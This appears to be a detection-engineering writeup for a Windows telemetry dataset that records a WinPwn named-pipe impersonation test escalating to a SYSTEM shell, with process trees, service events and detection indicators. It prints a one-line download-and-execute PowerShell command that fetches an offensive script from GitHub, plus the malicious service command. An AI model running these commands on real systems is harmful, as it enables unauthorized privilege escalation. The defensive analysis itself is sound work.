# T1106-4: Native API — WinPwn - Get SYSTEM shell - Pop System Shell using NamedPipe Impersonation technique

## Technique Context

T1106 (Native API) covers the use of Windows API functions as an adversarial execution and privilege escalation primitive. The Named Pipe Impersonation technique exploits a specific Windows privilege escalation path: a process running as a privileged account creates a named pipe, convinces a SYSTEM-level service to connect to it, then calls `ImpersonateNamedPipeClient()` to assume the SYSTEM token. Once impersonated, the process can use `CreateProcess` with the elevated token to spawn a shell running as SYSTEM.

This test downloads `NamedPipeSystem.ps1` from the WinPwn repository at runtime:

```
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/NamedPipe/NamedPipeSystem.ps1')
```

The script creates a named pipe (`\\.\pipe\HighPriv`), registers a Windows service (`svcHighPriv`) that runs `cmd.exe` to write to that pipe, starts the service to trigger the SYSTEM connection, impersonates the pipe client, then uses `CreateProcess` to pop a SYSTEM shell. The service is cleaned up with `sc.exe delete svcHighPriv` afterward.

## What This Dataset Contains

This dataset was collected on ACME-WS06, a Windows 11 Enterprise domain workstation with Microsoft Defender disabled. This is the most complex technique in this batch and produces the richest dataset.

**Process Chain (Security EID 4688):**

The execution sequence is visible across 15 Security 4688 events:

1. Test framework PowerShell (PID 5768) spawns `whoami.exe` (PID 2896) — pre-check
2. Test framework PowerShell (PID 5768) spawns child PowerShell (PID 6264) — the WinPwn download-and-IEX invocation
3. Child PowerShell (PID 6264) spawns `csc.exe` (PID 0x173c / 5948) — runtime .NET compilation
4. `csc.exe` spawns `cvtres.exe` (PID 0xf98) — resource compiler (part of .NET build chain)
5. Child PowerShell (PID 6264) spawns `powershell.exe` (PID 0xdd0) — intermediate PowerShell
6. Intermediate PowerShell spawns `powershell.exe` (PID 0x1924) — sub-shell
7. `services.exe` (PID 0x2f4) spawns `cmd.exe` (PID 0x770) with: `C:\windows\system32\cmd.exe /C echo Uuup! > \\.\pipe\HighPriv` — this is the svcHighPriv service execution under SYSTEM
8. `services.exe` spawns `svchost.exe` (PID 0x88c) running `svchost.exe -k netsvcs -p -s seclogon` — the Secondary Logon service being activated
9. Child PowerShell (PID 6264) spawns `powershell.exe` (PID 0x1450, bare `powershell.exe`) — likely the popped SYSTEM shell
10. Child PowerShell (PID 6264) spawns `cmd.exe` (PID 0x19cc) with: `"C:\Windows\System32\cmd.exe" /C sc.exe delete svcHighPriv` — cleanup
11. `cmd.exe` (PID 0x19cc) spawns `sc.exe` (PID 0x11a8) with: `sc.exe  delete svcHighPriv` — service cleanup
12. Test framework spawns child PowerShell (PID 0x1920) with `"powershell.exe" & {}` — test framework cleanup

**The svcHighPriv Service (System EID 7045 / 7009 / 7000):**

Three System channel events document the service lifecycle:
- **EID 7045** (Service Control Manager): `A service was installed in the system. Service Name: svcHighPriv. Service File Name: C:\windows\system32\cmd.exe /C echo Uuup! > \\.\pipe\HighPriv. Service Type: user mode service. Service Start Type: demand start. Service Account: LocalSystem.`
- **EID 7009**: `A timeout was reached (30000 milliseconds) while waiting for the svcHighPriv service to connect.`
- **EID 7000**: `The svcHighPriv service failed to start due to the following error: The service did not respond to the start or control request in a timely fashion.`

The service "failed" in the sense that `cmd.exe /C echo ... > \\.\pipe\HighPriv` exits immediately after writing to the pipe—it doesn't stay running as a persistent service. But the write to the named pipe is what the technique needs: the SYSTEM-level process connects to `\\.\pipe\HighPriv`, triggering the impersonation opportunity before it exits. The technique succeeds even though the service "fails."

**Named Pipes (Sysmon EID 17):**

Seven pipe creation events are captured. The technique creates multiple named pipes:
- `\PSHost.134180056145571382.5768.DefaultAppDomain.powershell` (test framework)
- `\PSHost.134180056321575604.6432.DefaultAppDomain.powershell` (cleanup)

The `\\.\pipe\HighPriv` pipe created by the WinPwn script itself is not in the Sysmon EID 17 sample (Sysmon captures named pipe creation by monitored processes, but the pipe creation by the PowerShell-compiled assembly may use a different path than what Sysmon's filter covers).

**File Creation (Sysmon EID 11):**

Twenty-four file creation events in the undefended run. Notable: `MsMpEng.exe` creates `C:\Windows\Temp\01dcb40cd5a427ee` (Defender housekeeping). Most file creation events capture PowerShell profile data writes and system state files rather than technique artifacts.

**Registry Writes (Sysmon EID 13):**

Seven registry set events captured, reflecting system activity during the technique's extended execution window. The seclogon service activation triggers registry activity.

**Network Connections (Sysmon EID 3):**

Three Sysmon EID 3 network events are present, likely from the svchost.exe seclogon service and MpCmdRun.exe activity triggered by the defense-disabled Defender scanning the new service registration.

**DNS Queries (Sysmon EID 22):**

Two DNS query events are captured. The download of `NamedPipeSystem.ps1` from GitHub would generate a DNS query for `raw.githubusercontent.com`, but the EID 22 events in the sample may reflect Defender cloud lookup activity rather than the WinPwn download.

**PowerShell Script Block Logging (EID 4104/4103):**

123 events: 116 EID 4104, 7 EID 4103. The highest count in the T1106 test series, reflecting the complexity of WinPwn's NamedPipe module and the multiple PowerShell shells spawned during execution.

## What This Dataset Does Not Contain

The `\\.\pipe\HighPriv` named pipe creation is not explicitly captured in the EID 17 sample. The impersonation call (`ImpersonateNamedPipeClient`) is an API call with no corresponding Windows event log entry. The resulting SYSTEM-level shell process, once created, would generate its own events—but only if subsequent commands are run within it, which is not part of this test.

The compiled C# assembly (used by WinPwn for the impersonation logic) and its output file are not captured in EID 11.

## Assessment

This is the richest dataset in the T1106 series. You have the complete service installation and failure cycle in the System channel (EIDs 7045, 7009, 7000), the full process tree showing how SYSTEM processes are invoked (`services.exe → cmd.exe /C echo Uuup! > \\.\pipe\HighPriv`), csc.exe and cvtres.exe compilation, and the sc.exe service cleanup. The service name `svcHighPriv`, the pipe name `\\.\pipe\HighPriv`, and the service binary `cmd.exe /C echo Uuup! > \\.\pipe\HighPriv` are all present verbatim in Security 4688 and System 7045 events.

Compared to the defended variant (sysmon 117, security 35, powershell 61), the undefended dataset has comparable Sysmon coverage (119 events vs. 117) and lower Security events (15 vs. 35). The defended variant's higher Security count reflects MpCmdRun.exe spawning and Defender response processes. The undefended run has many more PowerShell events (123 vs. 61) because WinPwn runs to completion without interruption.

## Detection Opportunities Present in This Data

**IEX + DownloadString with WinPwn NamedPipe URL (EID 1 / EID 4688):** The specific URL `https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/NamedPipe/NamedPipeSystem.ps1` is a known offensive tool indicator.

**Service installation with cmd.exe binary writing to a named pipe (EID 7045):** `Service File Name: C:\windows\system32\cmd.exe /C echo ... > \\.\pipe\<name>` is a definitive NamedPipe impersonation indicator. Legitimate services do not use cmd.exe to echo to named pipes. Any service installation event (EID 7045) where the service binary is cmd.exe should be treated as immediately suspicious.

**services.exe spawning cmd.exe with pipe target (EID 4688):** `services.exe → cmd.exe /C echo Uuup! > \\.\pipe\HighPriv` is a direct fingerprint of this technique. The parent process being services.exe (PID 0x2f4) with a cmd.exe child running a pipe-write command is a high-confidence indicator.

**seclogon service activation during suspicious activity (EID 4688):** `svchost.exe -k netsvcs -p -s seclogon` (Secondary Logon) being activated during a suspicious PowerShell execution session is a corroborating indicator—Secondary Logon is legitimately used by the Named Pipe impersonation path in WinPwn.

**Service install followed immediately by service failure (EID 7045 + 7000):** A service that installs and fails within 30 seconds (EIDs 7045, 7009, 7000 in rapid sequence) is a known indicator of Named Pipe impersonation tools. Legitimate service installations don't fail immediately on first start.

**sc.exe delete svcHighPriv (EID 4688):** The cleanup command `sc.exe delete svcHighPriv` appearing shortly after the service installation is a behavioral indicator of post-exploitation cleanup.
